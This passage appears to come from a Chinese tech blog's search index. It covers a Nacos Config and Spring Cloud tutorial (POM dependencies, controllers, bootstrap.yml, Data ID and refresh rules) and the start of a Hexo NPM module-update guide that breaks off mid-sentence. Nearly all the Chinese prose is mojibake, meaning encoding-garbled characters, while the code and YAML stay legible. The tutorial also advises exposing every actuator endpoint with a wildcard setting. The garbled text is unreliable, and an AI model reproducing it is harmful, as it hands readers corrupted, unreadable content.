å¯¹åº”çš„æ˜¯ Spring Boot 2.0.x ç‰ˆæœ¬ï¼Œç‰ˆæœ¬ 1.5.x.RELEASE å¯¹åº”çš„æ˜¯ Spring Boot 1.5.x ç‰ˆæœ¬ï¼ŒNacos å®˜æ–¹ç‰ˆæœ¬è¯´æ˜å¯ä»¥çœ‹è¿™é‡Œã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.18.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;spring-cloud.version&gt;Greenwich.SR6&lt;/spring-cloud.version&gt; &lt;nacos-config-spring-cloud.version&gt;2.1.3.RELEASE&lt;/nacos-config-spring-cloud.version&gt;&lt;/properties&gt;&lt;!-- ç®¡ç†ä¾èµ– --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring-cloud.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;version&gt;${nacos-config-spring-cloud.version}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!-- åˆ©ç”¨ä¼ é€’ä¾èµ–ï¼Œå…¬å…±éƒ¨åˆ† --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 3.3ã€åˆ›å»º Service 1 å·¥ç¨‹åˆ›å»º Service 1 çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œéœ€è¦å¼•å…¥ spring-cloud-starter-alibaba-nacos-config ä¾èµ– 1234&lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Service 1 çš„ä¸»å¯åŠ¨ç±» 1234567@SpringBootApplicationpublic class Service1Application { public static void main(String[] args) { SpringApplication.run(Service1Application.class, args); }} åˆ›å»º Service 1 çš„ Controller æµ‹è¯•ç±»ï¼Œæ·»åŠ  Spring Cloud åŸç”Ÿ @RefreshScope æ³¨è§£æ¥å®ç°é…ç½®è‡ªåŠ¨æ›´æ–°ï¼Œæˆ–è€…æ‰‹åŠ¨é€šè¿‡ ConfigurableApplicationContext.getEnvironment().getProperty() æ¥å®æ—¶è·å–æœ€æ–°çš„é…ç½®ä¿¡æ¯ 12345678910111213@RestController@RequestMapping("/config")@RefreshScopepublic class ConfigController { @Value("${common.name}") private String config2; @GetMapping("/get") public String get() { return config2; }} æ·»åŠ  Service 1 éœ€è¦çš„ bootstrap.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ 12345678910111213server: port: 56010spring: application: name: service-1 cloud: nacos: config: server-addr: 127.0.0.1:8848 #é…ç½®ä¸­å¿ƒçš„åœ°å€ namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 #å‘½åç©ºé—´ group: TEST_GROUP #é…ç½®åˆ†ç»„ file-extension: yaml #ç”±äºå½“å‰ç¯å¢ƒå¯¹åº”çš„profileä¸ºç©ºï¼Œè¿™é‡Œçš„Data IDçš„åç§°å°±æ˜¯applicationçš„nameåŠ ä¸Šfile-extensionï¼Œå³service-1.yaml 3.4ã€åˆ›å»º Service 2 å·¥ç¨‹åˆ›å»º Service 2 çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œéœ€è¦å¼•å…¥ spring-cloud-starter-alibaba-nacos-config ä¾èµ– 1234&lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Service 2 çš„ä¸»å¯åŠ¨ç±» 1234567@SpringBootApplicationpublic class Service2Application { public static void main(String[] args) { SpringApplication.run(Service2Application.class, args); }} åˆ›å»º Service 2 çš„ Controller æµ‹è¯•ç±»ï¼Œæ·»åŠ  Spring Cloud åŸç”Ÿ @RefreshScope æ³¨è§£æ¥å®ç°é…ç½®è‡ªåŠ¨æ›´æ–°ï¼Œæˆ–è€…æ‰‹åŠ¨é€šè¿‡ ConfigurableApplicationContext.getEnvironment().getProperty() æ¥å®æ—¶è·å–æœ€æ–°çš„é…ç½®ä¿¡æ¯ 1234567891011121314151617181920@RestController@RequestMapping("/config")public class ConfigController { @Value("${common.name}") private String config2; @Autowired private ConfigurableApplicationContext applicationContext; @GetMapping("/get") private String get() { return config2; } @GetMapping("/getRealTime") private String getRealTime() { return applicationContext.getEnvironment().getProperty("common.name"); }} æ·»åŠ  Service 2 éœ€è¦çš„ bootstrap.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ 12345678910111213server: port: 56011spring: application: name: service-2 cloud: nacos: config: server-addr: 127.0.0.1:8848 #é…ç½®ä¸­å¿ƒçš„åœ°å€ namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 #å‘½åç©ºé—´ group: TEST_GROUP #é…ç½®åˆ†ç»„ file-extension: yaml #ç”±äºå½“å‰ç¯å¢ƒå¯¹åº”çš„profileä¸ºç©ºï¼Œè¿™é‡Œçš„Data IDçš„åç§°å°±æ˜¯applicationçš„nameåŠ ä¸Šfile-extensionï¼Œå³service-2.yaml 3.5ã€æµ‹è¯•åº”ç”¨ç¨‹åº åˆ†åˆ«å¯åŠ¨ nacos-service-1ã€nacos-service-2 åº”ç”¨ æµè§ˆå™¨è®¿é—® http://127.0.0.1:56010/config/getï¼Œè‹¥å“åº”ç»“æœä¸º service-1-configï¼Œåˆ™è¯´æ˜ nacos-service-1 åº”ç”¨è¿è¡Œæ­£å¸¸ é€šè¿‡ Nacos çš„æ§åˆ¶å°æ›´æ”¹ Data ID ä¸º service-1.yaml çš„é…ç½®å†…å®¹ï¼Œç„¶åå†æ¬¡è®¿é—® http://127.0.0.1:56010/config/getï¼Œè‹¥å“åº”ç»“æœå‘ç”Ÿäº†å˜åŒ–ï¼Œåˆ™è¯´æ˜ nacos-service-1 åº”ç”¨å¯ä»¥å®æ—¶æ„ŸçŸ¥åˆ° Nacos Server çš„é…ç½®å˜æ›´ å‚è€ƒæ­¥éª¤äºŒå’Œæ­¥éª¤ä¸‰ï¼Œæµ‹è¯• nacos-service-2 åº”ç”¨å³å¯ Nacos Config Spring Cloud å¸¸ç”¨é…ç½®å¸¸ç”¨çš„é…ç½®å‚æ•°åœ¨ä¸Šé¢çš„ bootstrap.yaml é…ç½®æ–‡ä»¶ä¸­ï¼Œä¹‹æ‰€ä»¥éœ€è¦é…ç½® spring.application.nameï¼Œæ˜¯å› ä¸ºå®ƒæ˜¯æ„æˆ Nacos é…ç½®ç®¡ç† dataId å­—æ®µçš„ä¸€éƒ¨åˆ†ï¼Œåœ¨ Nacos Spring Cloud ä¸­ï¼ŒdataId çš„å®Œæ•´æ ¼å¼å¦‚ä¸‹ï¼š 1${prefix}-${spring.profiles.active}.${file-extension} group é»˜è®¤ä¸º DEFAULT_GROUPï¼Œå¯ä»¥é€šè¿‡ spring.cloud.nacos.config.group æ¥é…ç½® prefix é»˜è®¤ä¸º spring.application.name çš„å€¼ï¼Œä¹Ÿå¯ä»¥é€šè¿‡é…ç½®é¡¹ spring.cloud.nacos.config.prefix æ¥é…ç½® namespace é»˜è®¤ä¸º public å‘½åç©ºé—´çš„ IDï¼Œå¯ä»¥é€šè¿‡ spring.cloud.nacos.config.namespace æ¥é…ç½®ï¼Œè¿™é‡Œçš„å€¼æ˜¯ Namespace çš„ ID file-exetension ä¸ºé…ç½®å†…å®¹çš„æ•°æ®æ ¼å¼ï¼Œå¯ä»¥é€šè¿‡é…ç½®é¡¹ spring.cloud.nacos.config.file-extension æ¥é…ç½®ï¼Œç›®å‰åªæ”¯æŒ properties å’Œ yaml ç±»å‹ spring.profiles.active å³ä¸ºå½“å‰ç¯å¢ƒå¯¹åº”çš„ profileã€‚ç‰¹åˆ«æ³¨æ„ï¼šå½“ spring.profiles.active ä¸ºç©ºæ—¶ï¼Œå¯¹åº”çš„è¿æ¥ç¬¦ - ä¹Ÿå°†ä¸å­˜åœ¨ï¼ŒdataId çš„æ‹¼æ¥æ ¼å¼ä¼šå˜æˆ ${prefix}.${file-extension} å®Œæ•´çš„é…ç½®å‚æ•° é…ç½®æ–‡ä»¶åŠ è½½é¡ºåºè‹¥é¡¹ç›®ä¸­åŒæ—¶å­˜åœ¨ bootstrap.yaml å’Œ application.yml é…ç½®æ–‡ä»¶ï¼Œé‚£ä¹ˆ Nacos Config Spring Cloud çš„é…ç½®ä¿¡æ¯å¿…é¡»å†™åœ¨ bootstrap.yml é…ç½®æ–‡ä»¶é‡Œï¼Œå› ä¸º Spring Boot ä¼šä¼˜å…ˆåŠ è½½ bootstrap.yml é…ç½®æ–‡ä»¶ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œbootstrap.yml ä½œç”¨äºåº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡çš„å¼•å¯¼é˜¶æ®µï¼Œbootstrap.yml ç”±çˆ¶ Spring ApplicationContext åŠ è½½ã€‚ è‡ªå®šä¹‰ Data ID é…ç½®è‡ªå®šä¹‰æ‰©å±• Data ID é…ç½®åœ¨æ—¥å¸¸é¡¹ç›®å¼€å‘ä¸­ï¼Œå•ä¸ªå¾®æœåŠ¡å¯èƒ½æ‹¥æœ‰å¤šä¸ªé…ç½®æ–‡ä»¶ï¼Œå¯¹åº”çš„å°±æ˜¯ Nacos ä¸­çš„å¤šä¸ª Data IDï¼ˆé…ç½®é›†ï¼‰ï¼Œä¾‹å¦‚åŒ…æ‹¬å…¨å±€é…ç½®ã€å±€éƒ¨é…ç½®ç­‰ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œè€Œä¸Šé¢çš„æ¡ˆä¾‹åªèƒ½ä½¿ç”¨é…ç½®å•ä¸€çš„ Data IDï¼ˆé…ç½®é›†ï¼‰ï¼Œæ— æ³•æ»¡è¶³å®é™…çš„å¼€å‘éœ€æ±‚ã€‚ä½† Nacos Config Spring CLoud æä¾›äº†è‡ªå®šä¹‰æ‰©å±• Data ID çš„é…ç½®ï¼Œä»¥æ­¤æ¥è§£å†³è¯¥é—®é¢˜ã€‚åœ¨ä»¥ä¸‹æ¡ˆä¾‹ä¸­ï¼Œé¦–å…ˆé€šè¿‡ Nacos çš„æ§åˆ¶å°æ–°å¢äº†å…¨å±€é…ç½®ï¼ˆextension-config-01.yamlï¼‰ä¸é»˜è®¤é…ç½®ï¼ˆextension-config-02.yamlï¼‰ï¼Œç„¶ååœ¨ bootstrap.yaml é…ç½®æ–‡ä»¶ä¸­é€šè¿‡ extension-configs æ ‡ç­¾æ¥é…ç½®å¤šä¸ª Data IDï¼ˆé…ç½®é›†ï¼‰ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ ä½¿ç”¨åœºæ™¯ å‘å¸ƒé…ç½® 123456Namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18Data ID: extension-config-01.yamlGroup: GLOBAL_GROUPé…ç½®æ ¼å¼: YAMLé…ç½®å†…å®¹: common: address: 127.0.0.1 123456Namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18Data ID: extension-config-02.yamlGroup: DEFAULT_GROUPé…ç½®æ ¼å¼: YAMLé…ç½®å†…å®¹: common: threads: 2000 é…ç½®ç¤ºä¾‹ å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨æ—§ç‰ˆ Nacos Config Spring Cloud ä¸­ï¼Œä½¿ç”¨çš„æ ‡ç­¾æ˜¯ ext-configï¼Œä¸‹æ ‡éƒ½æ˜¯ä»é›¶å¼€å§‹ï¼Œé…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š 12345678910111213141516171819server: port: 56010spring: application: name: service cloud: nacos: config: server-addr: 127.0.0.1:8848 #é…ç½®ä¸­å¿ƒçš„åœ°å€ namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 #å‘½åç©ºé—´ extension-configs[0]: data-id: extension-config-01.yaml group: GLOBAL_GROUP refresh: true extension-configs[1]: data-id: extension-config-02.yaml group: DEFAULT_GROUP refresh: true é€šè¿‡ spring.cloud.nacos.config.extension-config[n].data-id çš„é…ç½®æ–¹å¼æ¥æ”¯æŒå¤šä¸ª Data ID çš„é…ç½® é€šè¿‡ spring.cloud.nacos.config.extension-config[n].group çš„é…ç½®æ–¹å¼è‡ªå®šä¹‰ Data ID æ‰€åœ¨çš„ç»„ï¼Œä¸é…ç½®çš„è¯ï¼Œé»˜è®¤æ˜¯ DEFAULT_GROUP é€šè¿‡ spring.cloud.nacos.config.extension-config[n].refresh çš„é…ç½®æ–¹å¼æ¥æ§åˆ¶è¯¥ Data ID åœ¨é…ç½®å˜æ›´æ—¶ï¼Œæ˜¯å¦æ”¯æŒåœ¨åº”ç”¨ä¸­å¯åŠ¨æ€åˆ·æ–°ï¼Œæ„ŸçŸ¥åˆ°æœ€æ–°çš„é…ç½®å€¼ï¼Œé»˜è®¤æ˜¯ä¸æ”¯æŒçš„ å¤šä¸ª Data ID åŒæ—¶é…ç½®æ—¶ï¼Œä¼˜å…ˆçº§å…³ç³»æ˜¯ spring.cloud.nacos.config.extension-config[n].data-id å…¶ä¸­ n çš„å€¼è¶Šå¤§ï¼Œä¼˜å…ˆçº§è¶Šé«˜ spring.cloud.nacos.config.extension-config[n].data-id çš„å€¼å¿…é¡»å¸¦æ–‡ä»¶æ‰©å±•åï¼Œæ–‡ä»¶æ‰©å±•åæ”¯æŒ propertiesã€yaml/ymlï¼Œæ­¤æ—¶ spring.cloud.nacos.config.file-extension çš„é…ç½®å‚æ•°å¯¹è‡ªå®šä¹‰æ‰©å±•é…ç½®çš„ Data ID æ–‡ä»¶æ‰©å±•åæ²¡æœ‰å½±å“ Java ä»£ç  12345678910111213141516@RestController@RequestMapping("/config")@RefreshScopepublic class ConfigController { @Value(("${common.address}")) private String address; @Value("${common.threads}") private String threads; @GetMapping("/get") public String get() { return "address: " + address + " threads: " + threads; }} è‡ªå®šä¹‰å…±äº« Data ID é…ç½®ä¸ºäº†æ›´åŠ æ¸…æ™°åœ°åœ¨å¤šä¸ªåº”ç”¨é—´é…ç½®å…±äº«çš„ Data IDï¼Œå¯ä»¥ä½¿ç”¨ spring.cloud.nacos.config.shared-dataids æ ‡ç­¾æ¥å®šä¹‰ Data IDã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨æ–°ç‰ˆçš„ Nacos Config Spring Cloud ä¸­ï¼Œä½¿ç”¨çš„æ ‡ç­¾å‡çº§ä¸º spring.cloud.nacos.config.shared-configsã€‚å½“ä½¿ç”¨è‡ªå®šä¹‰å…±äº« Data ID é…ç½®çš„æ–¹å¼æ—¶ï¼Œåªèƒ½è¯»å–åˆ°é…ç½®åˆ†ç»„ï¼ˆGroupï¼‰ä¸º DEFAULT_GROUP çš„ Data IDï¼Œå¦‚æœ Data ID å½’å±äºå…¶ä»–éé»˜è®¤çš„é…ç½®åˆ†ç»„ï¼ˆDEFAULT_GROUPï¼‰ï¼Œåˆ™æ— æ³•è¯»å–å¯¹åº”çš„é…ç½®ä¿¡æ¯ï¼Œæ‰€ä»¥è‡ªå®šä¹‰å…±äº« Data ID é…ç½®çš„æ–¹å¼åœ¨å®é™…å¼€å‘ä¸­ä½¿ç”¨é¢‘ç‡è¾ƒä½ã€‚ é…ç½®ç¤ºä¾‹ 12345678910111213server: port: 56010spring: application: name: service cloud: nacos: config: server-addr: 127.0.0.1:8848 #é…ç½®ä¸­å¿ƒçš„åœ°å€ namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 #å‘½åç©ºé—´ shared-dataids: shared-config-01.yaml,shared-config-02.yaml refreshable-dataids: shared-config-01.yaml é€šè¿‡ spring.cloud.nacos.config.shared-dataids æ¥æ”¯æŒå¤šä¸ªå…±äº« Data ID çš„é…ç½®ï¼Œå¤šä¸ªä¹‹é—´ç”¨é€—å·éš”å¼€ é€šè¿‡ spring.cloud.nacos.config.refreshable-dataids æ¥æ”¯æŒå“ªäº›å…±äº«é…ç½®çš„ Data ID åœ¨é…ç½®å˜åŒ–æ—¶ï¼Œåœ¨åº”ç”¨ä¸­æ˜¯å¦å¯åŠ¨æ€åˆ·æ–°ï¼Œæ„ŸçŸ¥åˆ°æœ€æ–°çš„é…ç½®å€¼ï¼Œå¤šä¸ª Data ID ä¹‹é—´ç”¨é€—å·éš”å¼€ã€‚å¦‚æœæ²¡æœ‰é…ç½®æ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹æ‰€æœ‰å…±äº«é…ç½®çš„ Data ID éƒ½ä¸æ”¯æŒåŠ¨æ€åˆ·æ–° é€šè¿‡ spring.cloud.nacos.config.shared-dataids æ¥æ”¯æŒå¤šä¸ªå…±äº«é…ç½®çš„ Data ID æ—¶ï¼Œ å¤šä¸ªå…±äº«é…ç½®é—´çš„ä¼˜å…ˆçº§å…³ç³»ç”±é…ç½®å‡ºç°çš„å…ˆåé¡ºåºæ¥å†³å®šï¼Œå³åé¢çš„ä¼˜å…ˆçº§è¦é«˜äºå‰é¢ é€šè¿‡ spring.cloud.nacos.config.shared-dataids æ¥é…ç½®æ—¶ï¼ŒData ID å¿…é¡»å¸¦æ–‡ä»¶æ‰©å±•åï¼Œæ–‡ä»¶æ‰©å±•åæ—¢å¯æ”¯æŒ propertiesã€yaml/ymlï¼Œæ­¤æ—¶ spring.cloud.nacos.config.file-extension çš„é…ç½®å‚æ•°å¯¹è‡ªå®šä¹‰å…±äº«é…ç½®çš„ Data ID æ–‡ä»¶æ‰©å±•åæ²¡æœ‰å½±å“ spring.cloud.nacos.config.refreshable-dataids é…ç½®å“ªäº› Data ID éœ€è¦æ”¯æŒåŠ¨æ€åˆ·æ–°æ—¶ï¼ŒData ID çš„å€¼ä¹Ÿå¿…é¡»æ˜ç¡®ç»™å‡ºæ–‡ä»¶æ‰©å±•å é…ç½®åŠ è½½çš„ä¼˜å…ˆçº§æ–°ç‰ˆçš„ Nacos Config Spring Cloud ç›®å‰æä¾›äº†ä¸‰ç§é…ç½®èƒ½åŠ›ä» Nacos æ‹‰å–ç›¸å…³çš„é…ç½®ï¼Œå…·ä½“å¦‚ä¸‹ï¼š A: é€šè¿‡ spring.cloud.nacos.config.shared-configs æ”¯æŒå¤šä¸ªå…±äº« Data ID çš„é…ç½® B: é€šè¿‡ spring.cloud.nacos.config.extension-configs[n].data-id çš„æ–¹å¼æ”¯æŒå¤šä¸ªæ‰©å±• Data ID çš„é…ç½® C: é€šè¿‡å†…éƒ¨ç›¸å…³è§„åˆ™ï¼ˆåº”ç”¨å æˆ–è€… åº”ç”¨å + Profileï¼‰ï¼Œå³ ${prefix}-${spring.profiles.active}.${file-extension} è§„åˆ™æ¥è‡ªåŠ¨ç”Ÿæˆç›¸å…³çš„ Data ID é…ç½® å½“ä¸‰ç§æ–¹å¼å…±åŒä½¿ç”¨æ—¶ï¼Œä¼˜å…ˆçº§å…³ç³»æ˜¯ï¼š A &lt; B &lt; C å®Œå…¨å…³é—­é…ç½®è‹¥å¸Œæœ›å®Œå…¨å…³é—­ Nacos Config Spring Cloudï¼Œå¯ä»¥é€šè¿‡è®¾ç½® spring.cloud.nacos.config.enabled=false æ¥å…³é—­ã€‚ Nacos Config Spring Cloud åŸç†æµ…æè‡ªåŠ¨æ³¨å…¥Nacos Config Starter å®ç°äº† org.springframework.cloud.bootstrap.config.PropertySourceLocator æ¥å£ï¼Œå¹¶å°†ä¼˜å…ˆçº§è®¾ç½®æˆäº†æœ€é«˜ã€‚åœ¨ Spring Cloud åº”ç”¨å¯åŠ¨é˜¶æ®µï¼Œä¼šä¸»åŠ¨ä» Nacos Server ç«¯è·å–å¯¹åº”çš„æ•°æ®ï¼Œå¹¶å°†è·å–åˆ°çš„æ•°æ®è½¬æ¢æˆ PropertySource ä¸”æ³¨å…¥åˆ° Environment çš„ PropertySources å±æ€§ä¸­ï¼Œæ‰€ä»¥ä½¿ç”¨ @Value æ³¨è§£ä¹Ÿèƒ½ç›´æ¥è·å– Nacos Server ç«¯é…ç½®çš„å†…å®¹ã€‚ åŠ¨æ€åˆ·æ–°Nacos Config Starter é»˜è®¤ä¸ºæ‰€æœ‰è·å–æ•°æ®æˆåŠŸçš„ Nacos çš„é…ç½®é¡¹æ·»åŠ äº†ç›‘å¬åŠŸèƒ½ï¼Œåœ¨ç›‘å¬åˆ°æœåŠ¡ç«¯é…ç½®å‘ç”Ÿå˜åŒ–æ—¶ä¼šå®æ—¶è§¦å‘ org.springframework.cloud.context.refresh.ContextRefresher çš„ refresh() æ–¹æ³• ã€‚å¦‚æœéœ€è¦å¯¹ Bean è¿›è¡ŒåŠ¨æ€åˆ·æ–°ï¼Œç»™ç±»æ·»åŠ  @RefreshScope æˆ– @ConfigurationProperties æ³¨è§£å³å¯ã€‚ è¡¥å……å†…å®¹Endpoint ä¿¡æ¯æŸ¥çœ‹Spring Boot æ”¯æŒè¿™ä¸€ç‚¹ï¼ŒNacos Config ä¹Ÿå¯ä»¥ä½¿ç”¨ Endpoint æ¥æš´éœ²ä¿¡æ¯ã€‚åœ¨ Maven ä¸­æ·»åŠ  spring-boot-starter-actuator ä¾èµ–ï¼Œå¹¶åœ¨é…ç½®ä¸­å…è®¸ Endpoints çš„è®¿é—®å³å¯ã€‚ Spring Boot 1.x ä¸­æ·»åŠ é…ç½® management.security.enabled=false Spring Boot 2.x ä¸­æ·»åŠ é…ç½® management.endpoints.web.exposure.include=* Spring Boot 1.x å¯ä»¥é€šè¿‡è®¿é—® http://127.0.0.1:18084/nacos_config æ¥æŸ¥çœ‹ Nacos Endpoint çš„ä¿¡æ¯ Spring Boot 2.x å¯ä»¥é€šè¿‡è®¿é—® http://127.0.0.1:18084/actuator/nacos-config æ¥æŸ¥çœ‹ Nacos Endpoint çš„ä¿¡æ¯ ä¸‹ç¯‡ - Nacos å…¥é—¨æ•™ç¨‹ - é…ç½®ç®¡ç†ï¼ˆé«˜çº§ç¯‡ï¼‰ Nacos å…¥é—¨æ•™ç¨‹ - é…ç½®ç®¡ç†é«˜çº§ç¯‡ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"Hexo æ›´æ–° NPM æ¨¡å—",url:"/posts/7ffec382.html",text:'ç³»ç»Ÿç¯å¢ƒ 123NPMï¼š6.4.1NodeJsï¼š v10.15.0Linuxï¼š Debian 9ï¼ˆstretchï¼‰ NPM æ›´æ–°æ¨¡å—ï¼ˆç¬¬ä¸€ç§æ–¹æ³•ï¼‰ å‡è®¾éœ€è¦å°†æ¨¡å— hexo-site-auth@0.0.3 æ›´æ–°è‡³ hexo-site-auth@0.0.4ï¼Œå¯å‚è€ƒä»¥ä¸‹æ“ä½œæ­¥éª¤ã€‚ç”±äºå›½å†…ä¸‹è½½ NPM æ¨¡å—çš„ç½‘é€Ÿå¾ˆæ…¢ï¼Œå»ºè®®ä½¿ç”¨ä»£ç†è¿›è¡Œä¸‹è½½ã€‚æ³¨æ„è¿™é‡Œä¸èƒ½ä½¿ç”¨ CNPM + æ·˜å®é•œåƒæ¥å®‰è£… NPM æ¨¡å—ï¼Œå…·ä½“åŸå› ä¸‹é¢ä¼šç»™å‡ºè§£é‡Šã€‚ 1234567# è¿›å…¥Hexoçš„æ ¹ç›®å½•$ cd hexo_blog# æ›´æ–°NPMæ¨¡å—ï¼ˆä¸æ¨¡å—çš„å®‰è£…æ“ä½œæ²¡æœ‰æœ¬è´¨åŒºåˆ«ï¼Œåªæ˜¯æŒ‡å®šäº†æ–°çš„ç‰ˆæœ¬å·ï¼‰ï¼Œå¦‚æœæ‰§è¡Œå¤±è´¥å¯å°è¯•åˆ é™¤package-lock.jsonæ–‡ä»¶åå†æ›´æ–°$ npm install hexo-site-auth@0.0.4 --save# æç¤ºï¼šå½“å®‰è£…å‘½ä»¤ä¸å¸¦å…·ä½“ç‰ˆæœ¬å·æ—¶ï¼Œåˆ™è¡¨ç¤ºé»˜è®¤å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„NPMæ¨¡å— NPM æ›´æ–°æ¨¡å—ï¼ˆç¬¬äºŒç§æ–¹æ³•ï¼‰ 123456789101112# è¿›å…¥Hexoçš„æ ¹ç›®å½•$ cd hexo_blog# ç¼–è¾‘package.jsoné…ç½®æ–‡ä»¶ï¼Œæ›´æ”¹å¯¹åº”æ¨¡å—çš„ç‰ˆæœ¬å·ä¸ºç›®æ ‡ç‰ˆæœ¬å·$ vim package.json"hexo-site-auth": "0.0.4"# å®‰è£…NPMæ¨¡å—$ npm install# è‹¥å®‰è£…å¤±è´¥ï¼Œå¯ä»¥å°è¯•åˆ é™¤NPMçš„æ•´ä¸ªæ¨¡å—ç›®å½•åå†å®‰è£…$ rm -rf node_modules æ£€æŸ¥æ›´æ–°æ¨¡å—æ˜¯å¦æˆåŠŸ 12345678910# é€šè¿‡Hexoæ¸…ç†Publicç›®å½•$ hexo clean# é€šè¿‡Hexoæ„å»ºé™æ€æ–‡ä»¶$ hexo generate# é€šè¿‡Hexoå¯åŠ¨æœåŠ¡$ hexo server# è‹¥Hexoçš„WebæœåŠ¡å¯ä»¥æ­£å¸¸å¯åŠ¨ï¼Œåˆ™è¯´æ˜NPMæ¨¡å—æ›´æ–°æˆåŠŸ Gulp å‹ç¼©å›¾ç‰‡å¤±è´¥ è‹¥ä¸Šé¢ä½¿ç”¨æ·˜å®çš„ CNPM + æ·˜å®é•œåƒæ¥å®‰è£… NPM æ¨¡å—ï¼Œæ•´ä¸ªå®‰è£…è¿‡ç¨‹å¾ˆé¡ºåˆ©ï¼Œä½† Gulp æ‰§è¡Œå›¾ç‰‡å‹ç¼©çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šå‡ºç°ä»¥ä¸‹é”™è¯¯ã€‚åˆæ­¥åˆ¤æ–­æ˜¯ CNPM å®‰è£… gulp-imagemin æ¨¡å—æ—¶å‡ºäº†é—®é¢˜ï¼Œæ­¤æ—¶éœ€è¦å…ˆå¸è½½ gulp-imageminï¼Œç„¶åä½¿ç”¨ NPM å·¥å…·é‡æ–°å®‰è£… gulp-imageminã€‚ 12345remote: (node:2037) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 282)remote: (node:2037) UnhandledPromiseRejectionWarning: Error: spawn /home/git/blog-githooks-build-repo/node_modules/_optipng-bin@5.1.0@optipng-bin/vendor/optipng EACCESremote: at Process.ChildProcess._handle.onexit (internal/child_process.js:232:19)remote: at onErrorNT (internal/child_process.js:407:16)remote: at process._tickCallback (internal/process/next_tick.js:63:19) 12345678910# è¿›å…¥Hexoçš„æ ¹ç›®å½•$ cd hexo_blog# å¸è½½gulp-imagemin$ npm uninstall gulp-imagemin@5.0.3 --save# å®‰è£…gulp-imagemin$ npm install gulp-imagemin@5.0.3 --save# å¼ºçƒˆå»ºè®®ç›´æ¥åˆ é™¤æ•´ä¸ªnode_modulesç›®å½•ï¼Œç„¶åä½¿ç”¨NPMå·¥å…·é‡æ–°å®‰è£…æ‰€æœ‰æ¨¡å— æ³¨æ„äº‹é¡¹ package-lock.json æ–‡ä»¶ä¸æ˜¯å¿…è¦çš„ï¼Œå¦‚æœå¸Œæœ›æ›´æ–°è¯¥æ–‡ä»¶ï¼Œå¯ç›´æ¥åˆ é™¤æ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œ â€œnpm installâ€ æ“ä½œåä¼šè‡ªåŠ¨é‡æ–°ç”Ÿæˆè¯¥æ–‡ä»¶ æ‰§è¡Œ â€œnpm installâ€ æ“ä½œåï¼Œå¯ä»¥æ¥ç€æ‰§è¡Œ â€œnpm audit fixâ€ï¼Œä½†ç»å¯¹ä¸èƒ½å†æ‰§è¡Œ â€œnpm audit fix â€“forceâ€ï¼Œå¦åˆ™ä¼šå¼ºåˆ¶å‡çº§ NPM 